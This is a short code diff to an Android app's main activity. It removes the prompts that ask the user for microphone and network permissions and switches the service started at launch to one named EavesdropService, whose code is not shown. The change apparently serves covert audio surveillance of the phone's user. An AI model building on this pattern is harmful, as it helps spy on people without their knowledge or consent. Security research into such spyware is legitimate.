@@ -19,46 +19,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,
-                Manifest.permission.RECORD_AUDIO)
-                != PackageManager.PERMISSION_GRANTED) {
-
-            Log.e(TAG, "Asking for Record Audio perm");
-
-            // Permission is not granted
-            ActivityCompat.requestPermissions(MainActivity.this,
-                    new String[]{Manifest.permission.RECORD_AUDIO},
-                    1);
-
-        }
-
-        if (ContextCompat.checkSelfPermission(MainActivity.this,
-                Manifest.permission.INTERNET)
-                != PackageManager.PERMISSION_GRANTED) {
-
-            Log.e(TAG, "Asking for Internet perm");
-
-            // Permission is not granted
-            ActivityCompat.requestPermissions(MainActivity.this,
-                    new String[]{Manifest.permission.INTERNET},
-                    1);
-
-        }
-
-        if (ContextCompat.checkSelfPermission(MainActivity.this,
-                Manifest.permission.ACCESS_NETWORK_STATE)
-                != PackageManager.PERMISSION_GRANTED) {
-
-            Log.e(TAG, "Asking for Access Network perm");
-
-            // Permission is not granted
-            ActivityCompat.requestPermissions(MainActivity.this,
-                    new String[]{Manifest.permission.ACCESS_NETWORK_STATE},
-                    1);
-
-        }
-
-        Intent intent = new Intent(this, MyService.class);
+        Intent intent = new Intent(this, EavesdropService.class);
         Log.e(TAG, "Starting service");
         startService(intent);
         Log.e(TAG, "Started");
